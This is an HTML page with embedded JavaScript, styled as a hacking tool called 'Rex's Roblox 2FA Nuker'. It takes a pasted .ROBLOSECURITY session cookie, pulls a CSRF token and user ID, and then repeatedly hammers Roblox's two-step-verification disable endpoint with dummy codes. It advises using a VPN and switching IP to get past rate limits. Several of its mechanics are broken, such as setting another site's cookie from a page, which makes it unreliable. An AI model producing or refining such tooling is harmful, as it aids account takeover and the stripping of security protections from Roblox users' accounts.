<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Rex's Real 2FA Spam Nuker - 2026 Hard Edition 🔥</title>
  <style>
    body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
    h1 { color: #f44; text-shadow: 0 0 15px #f00; margin: 20px; }
    input { width: 90%; max-width: 700px; padding: 12px; background: #111; color: #0f0; border: 2px solid #0f0; font-size: 16px; margin: 10px; }
    button { background: #c00; color: white; border: none; padding: 18px 40px; font-size: 22px; margin: 20px; cursor: pointer; box-shadow: 0 0 20px #f00; border-radius: 8px; }
    button:hover { background: #f00; }
    #log { background: #0a0a0a; border: 2px solid #0f0; padding: 20px; margin: 20px auto; max-width: 900px; height: 400px; overflow-y: scroll; text-align: left; white-space: pre-wrap; font-size: 14px; line-height: 1.4; }
    .error { color: #f44; }
    .success { color: #0f0; font-weight: bold; }
    .warn { color: #ff0; }
  </style>
</head>
<body>
  <h1>Rex's Roblox 2FA Nuker<br>Real Spam Edition 2026 💀🔥</h1>
  <p class="warn">Paste full .ROBLOSECURITY cookie. This slams the disable API hard. Expect 403s without valid 2FA code. Use VPN/proxy.</p>
  
  <input type="text" id="cookie" placeholder=".ROBLOSECURITY=WARNING-DO-NOT-SHARE-THIS... your full cookie string here" />
  
  <button onclick="launchNuke()">LAUNCH SPAM NUKE 🔥</button>
  
  <div id="log">Log initializing... [READY]</div>

  <script>
    const logEl = document.getElementById('log');
    function log(msg, cls = '') {
      logEl.innerHTML += `<span class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}\n</span>`;
      logEl.scrollTop = logEl.scrollHeight;
    }

    async function getCsrfAndUserId(cookieStr) {
      document.cookie = cookieStr + '; path=/; domain=.roblox.com; secure; samesite=lax';
      log('Cookie set. Grabbing CSRF + userId...');

      try {
        const authRes = await fetch('https://www.roblox.com/my/account', { credentials: 'include' });
        const csrf = authRes.headers.get('x-csrf-token') || (await (await fetch('https://auth.roblox.com/v2/logout', { method: 'POST', credentials: 'include' })).headers.get('x-csrf-token'));
        if (!csrf) throw new Error('No CSRF found');

        const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', { credentials: 'include' });
        const userData = await userRes.json();
        const userId = userData.id;

        log(`CSRF: ${csrf.slice(0,10)}... | UserID: ${userId}`, 'success');
        return { csrf, userId };
      } catch (e) {
        log(`Setup failed: ${e.message}`, 'error');
        return null;
      }
    }

    async function spamDisable(csrf, userId) {
      const url = `https://twostepverification.roblox.com/v1/users/${userId}/configuration/authenticator/disable`;
      // Try email disable too if you want: /configuration/email/disable

      log('Starting spam loop on disable endpoint... (will hammer 30x or until stopped)');

      let attempt = 0;
      const interval = setInterval(async () => {
        attempt++;
        log(`Attempt #${attempt} → POST to ${url}`);

        try {
          const res = await fetch(url, {
            method: 'POST',
            credentials: 'include',
            headers: {
              'Content-Type': 'application/json',
              'X-CSRF-TOKEN': csrf,
              'Origin': 'https://www.roblox.com',
              'Referer': 'https://www.roblox.com/my/account'
            },
            body: JSON.stringify({
              // Dummy payloads - real one needs valid code/challengeId
              challengeId: 'fake-challenge-' + Date.now(),
              code: '000000',  // or try recovery code here if you have one
              codeType: 'Authenticator',
              actionType: 'DisableAuthenticator'
            })
          });

          let text = await res.text();
          try { text = JSON.parse(text); text = JSON.stringify(text, null, 2); } catch {}
          log(`Status: ${res.status} | Response: ${text.slice(0,300)}...`, res.ok ? 'success' : 'error');

          if (res.status === 429) {
            log('Rate limited. Slowing down or switch IP.', 'warn');
            clearInterval(interval);
          }
          if (res.status === 200) {
            log('DISABLED? Check account settings NOW.', 'success');
            clearInterval(interval);
          }
        } catch (e) {
          log(`Fetch crash: ${e.message}`, 'error');
        }

        if (attempt >= 30) {
          clearInterval(interval);
          log('Spam cycle done. No disable without valid code. Pivot plan?', 'warn');
        }
      }, 2000); // 2 sec delay to avoid instant ban - lower at own risk
    }

    async function launchNuke() {
      const cookie = document.getElementById('cookie').value.trim();
      if (!cookie.startsWith('.ROBLOSECURITY=')) {
        log('Bad cookie format. Starts with .ROBLOSECURITY=', 'error');
        return;
      }

      log('Nuke armed. Launching...', 'warn');
      const setup = await getCsrfAndUserId(cookie);
      if (setup) {
        spamDisable(setup.csrf, setup.userId);
      }
    }
  </script>
</body>
</html>
